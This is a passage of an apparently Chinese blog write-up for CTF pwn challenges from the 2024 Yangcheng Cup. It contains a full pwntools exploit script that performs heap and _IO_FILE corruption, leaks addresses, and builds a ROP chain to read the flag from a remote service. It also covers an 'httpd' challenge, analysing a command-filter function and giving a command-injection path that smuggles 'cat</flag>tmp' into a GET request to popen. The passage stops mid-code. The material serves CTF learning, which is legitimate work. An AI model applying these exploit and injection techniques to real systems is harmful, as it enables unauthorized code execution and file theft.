class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">34146</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">citys = [<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="string">b&#x27;fuzhou&#x27;</span>]</span><br><span class="line">trans = [<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;plane&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;distance.&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">tran,froms,tos,far,note</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;What kind of transportation do you want? car/train/plane?&#x27;</span>)</span><br><span class="line">    p.sendline(trans[tran])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;How far?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(far))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">froms,tos</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">froms,tos</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">djsk</span>(<span class="params">froms</span>):</span><br><span class="line">    meau(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x510</span>)</span><br><span class="line">show(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21ace0</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>),</span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x510</span>+p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">8888</span>)+p32(<span class="number">2</span>)) <span class="comment"># 4</span></span><br><span class="line">djsk(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">show(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1461</span></span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">large = libc_base + <span class="number">0x21b110</span></span><br><span class="line">heap = heap_base + <span class="number">0x2930</span></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">p.sendline(citys[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">p.sendline(citys[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Which one do you want to change?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How far?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">target = libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target - <span class="number">0x100</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: target-<span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x531</span>)+p64(large)*<span class="number">2</span>+p64(target-<span class="number">0x100</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>)+fake_io_read[<span class="number">0x30</span>:]</span><br><span class="line">p.send(payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">meau(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Wrong&#x27;</span>)</span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line">target = stack - <span class="number">712</span> + <span class="number">8</span></span><br><span class="line">lg(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000016333a</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x00000000000904a9</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000091316</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, target + <span class="number">0xc0</span>,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>,</span><br><span class="line">    pop_rsi_ret, target + <span class="number">0x150</span>,</span><br><span class="line">    pop_rdx_rbx_ret, <span class="number">0x30</span>,<span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line">    <span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h3><p>这题实现了一个http服务器，其功能是对get请求的路径进行访问，如果路径以及文件合法就会打印出文件的内容</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/5.png" class="" title="我的图图呢">  <p>如上图所示，程序对我们输入的路径进行了十分严格的过滤，我们无法直接获取<code>/flag</code>的内容，因为会给过滤掉，可是我注意到了下面有个<code>popen</code>函数<br>函数的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">FILE * <span class="title function_">popen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command , <span class="type">const</span> <span class="type">char</span> *type )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pclose</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>函数说明：</p><blockquote><p>popen()函数通过创建一个管道，调用fork()产生一个子进程，执行一个shell以运行命令来开启一个进程。这个管道必须由pclose()函数关闭，而不是fclose()函数。pclose()函数关闭标准I&#x2F;O流，等待命令执行结束，然后返回shell的终止状态。如果shell不能被执行，则pclose()返回的终止状态与shell已执行exit一样。<br>type参数只能是读或者写中的一种，得到的返回值（标准I&#x2F;O流）也具有和type相应的只读或只写类型。如果type是”r”则文件指针连接到command的标准输出；如果type是”w”则文件指针连接到command的标准输入。<br>command参数是一个指向以NULL结束的shell命令字符串的指针。这行命令将被传到bin&#x2F;sh并使用-c标志，shell将执行这个命令。<br>popen()的返回值是个标准I&#x2F;O流，必须由pclose来终止。前面提到这个流是单向的（只能用于读或写）。向这个流写内容相当于写入该命令的标准输入，命令的标准输出和调用popen()的进程相同；与之相反的，从流中读数据相当于读取命令的标准输出，命令的标准输入和调用popen()的进程相同。</p></blockquote><p>函数作用：</p><blockquote><p>popen函数允许一个程序将另外一个程序作为新进程来启动，并可以传递数据或者通过它接受数据。<br>其内部实现为调用 fork 产生一个子进程，执行一个 shell， 以运行命令来开启一个进程，这个进程必须由 pclose() 函数关闭。</p></blockquote><p>这么说<code>popen</code>函数就类似于<code>system</code>函数可以让我们进行任意命令执行，可是程序对我们输入的路径还进行了第二层过滤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_1F74</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> needle[<span class="number">3</span>]; <span class="comment">// [esp+15h] [ebp-13h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(needle, <span class="string">&quot;sh&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;bin&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">38</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">124</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">59</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">36</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">123</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">125</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">96</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, needle) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strstr</span>(a1, v3) == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != __readgsdword(<span class="number">0x14</span>u) )</span><br><span class="line">    sub_2A70();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们不能直接使用<code>/bin/sh</code>来起shell了，而且我们也不能直接<code>cat flag</code>，因为这中间有空格，会导致程序判断我们的get请求格式错误，所以我们可以先将&#x2F;flag的内容保存到当前目录下的tmp文件中，然后再读取该tmp文件来获取flag<br>转移flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;cat&lt;/flag&gt;tmp&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;get /&#123;&#125; HTTP/1.0\r&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(path).encode()</span><br><span 